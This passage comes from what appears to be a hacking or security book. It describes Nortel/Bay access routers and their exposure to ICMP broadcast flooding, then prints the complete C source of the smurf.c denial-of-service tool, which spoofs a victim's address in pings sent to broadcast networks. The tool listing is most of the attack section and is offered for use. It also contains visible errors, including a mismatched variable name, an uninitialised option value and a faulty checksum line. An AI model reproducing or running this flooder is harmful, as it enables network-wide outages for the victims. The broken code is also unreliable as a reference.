
## Nortel/Bay

Nortel Networks (www.nortelnetworks.com) is a global leader in access communications such as telephony, data, and wireless. Nortel has offices and facilities in Canada, Europe, Asia-Pacific, the Caribbean, Latin America, the Middle East, Africa, and the United States. Contending with Cabletron and Cisco, Nortel offers access routers that direct communication traffic across LANs and WANs, including multiservice platforms, extranet, and voice/data platforms. Although targeting medium and large offices and ISPs, Nortel offers access gateways for small office and home users as well. Nortel's claim to fame stems from its products' high-functional density, feature-rich modularity, and security flexibility.

## Liabilities

### Flooding

- **Synopsis:** Nortel/Bay Access routers are particularly vulnerable to ICMP echo request flooding.
- **Hack State:** Severe network congestion via broadcast storms.
- **Vulnerabilities:** LAN and WAN access gateways.
- **Breach:** The *smurf* attack is another network-level flooding attack against access routers. With smurf, a hacker sends excessive ICMP echo (PING) traffic at IP broadcast addresses, with a spoofed source address of a victim. There are, on a large broadcast network segment, potentially hundreds of machines to reply to each packet, causing a multitude of broadcast storms, thus flooding the network. During a broadcast storm, messages traverse the network, resulting in responses to these messages, then responses to responses, in a blizzard effect. These storms cause severe network congestion that can take down the most resilient internetworking hardware. The *smurf.c* program by renowned hacker TFreak, instigates broadcast storms by spoofing ICMP packets from a host, sent to various broadcast addresses, which generate compounded replies to that host from each packet.

### Smurf.c

```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

void banner(void);
void usage(char *);
void smurf(int, struct sockaddr_in, u_long, int);
void ctrlc(int);
unsigned short in_chksum(u_short *, int);

/* stomp */
char id[] = "$Id smurf.c,v 4.0 1997/10/11 13:02:42 EST tfreak Exp $";

int main (int argc, char *argv[])
{
   struct sockaddr_in sin;
   struct hostent *he;
   FILE *bcastfile;
   int i, sock, bcast, delay, num, pktsize, cycle = 0, x;
   char buf[32], **bcastaddr = malloc(8192);

   banner();

   signal(SIGINT, ctrlc);

   if (argc < 6) usage(argv[0]);

   if ((he = gethostbyname(argv[1])) == NULL) {
      perror("resolving source host");
      exit(-1);
   }
   memcpy((caddr_t)&sin.sin_addr, he->h_addr, he->h_length);
   sin.sin_family = AF_INET;
   sin.sin_port = htons(0);

   num = atoi(argv[3]);
   delay = atoi(argv[4]);
   pktsize = atoi(argv[5]);

   if ((bcastfile = fopen(argv[2], "r")) == NULL) {
      perror("opening bcast file");
      exit(-1);
   }
   x = 0;
   while (!feof(bcastfile)) {
      fgets(buf, 32, bcastfile);
      if (buf[0] == '#' || buf[0] == '\n' || ! isdigit(buf[0]))
         continue;
      for (i = 0; i < strlen(buf); i++)
         if (buf[i] == '\n') buf[i] = '\0';
      bcaddr[x] = malloc(32);
      strcpy(bcaddr[x], buf);
      x++;
   }
   bcaddr[x] = 0x0;
   fclose(bcastfile);
   if (x == 0) {
      fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n", argv[2]);
      exit(-1);
   }
   if (pktsize > 1024) {
      fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
      exit(-1);
   }
   if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
      perror("getting socket");
      exit(-1);
   }
   setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&bcast, sizeof(bcast));
   printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);
   for (i = 0; i < num || !num; i++) {
      if (!(i % 25)) { printf("."); fflush(stdout); }
      smurf(sock, sin, inet_addr(bcaddr[cycle]), pktsize);
      cycle++;
      if (bcaddr[cycle] == 0x0) cycle = 0;
      usleep(delay);
   }
   puts("\n\n");
   return 0;
}

void banner (void)
{
  puts("\nsmurf.c v4.0 by TFreak\n");
}

void usage (char *prog)
{
  fprintf(stderr, "usage: %s <target> <bcast_file> "
        "<num packets> <packet delay> <packet size>\n\n"
        "target = address to hit\n"
        "bcast_file = file to read broadcast addresses from\n"
        "num packets = number of packets to send (0 = flood)\n"
        "packet delay = wait between each packet (in ms)\n"
        "packet size = size of packet (< 1024)\n\n", prog);
  exit(-1);
}

void smurf (int sock, struct sockaddr_in sin, u_long dest, int psize)
{
  struct iphdr *ip;
  struct icmphdr *icmp;
  char *packet;

  packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
  ip = (struct iphdr *)packet;
  icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

  memset (packet, 0, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);

  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
  ip->ihl = 5;
  ip->version = 4;
  ip->ttl = 255;
  ip->tos = 0;
  ip->frag_off = 0;
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = sin.sin_addr.s_addr;
  ip->daddr = dest;
  ip->check = in_chksum((u_short *)ip, sizeof(struct iphdr));
  icmp->type = 8;
  icmp->code = 0;
  icmp->checksum = in_chksum((u_short *)icmp, sizeof(struct icmphdr) + psize);

  sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize,
     0, (struct sockaddr *)&sin, sizeof(struct sockaddr));

  free(packet);             /* free willy! */
}

void ctrlc(int ignored)
{
  puts("\nDone!\n");
  exit(1);
}

unsigned short in_chksum(u_short *addr, int len)
{
  register int nleft = len;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1) {
     sum += *addr++;
     nleft -= 2;
  }

  if (nleft == 1) {
     *(u_char *)(&answer) = *(u_char *)addr;
     sum += answer;
  }

  sum = (sum >> 16) + (sum + 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return(answer);
}
```

## Internet Server Daemons

A daemon is a program associated with UNIX systems that performs maintenance functionality; it does not have to be called by the user, and is always running and “listening” to a specified port for incoming service requests. Upon opening or activating one of these ports for communication, the program initiates a session to begin processing. Familiar types of daemons are those that handle FTP, telnet, or Web services. Web services on the Internet provide the Web-browsing foundation. Definitively, a Web server daemon (HTTPD) is a program that listens, customarily via TCP port 80, and accepts requests for information that are made according to the Hypertext Transfer Protocol (HTTP). The Web server daemon processes each HTTP request and returns a Web page document, as shown in Figure 9.5.
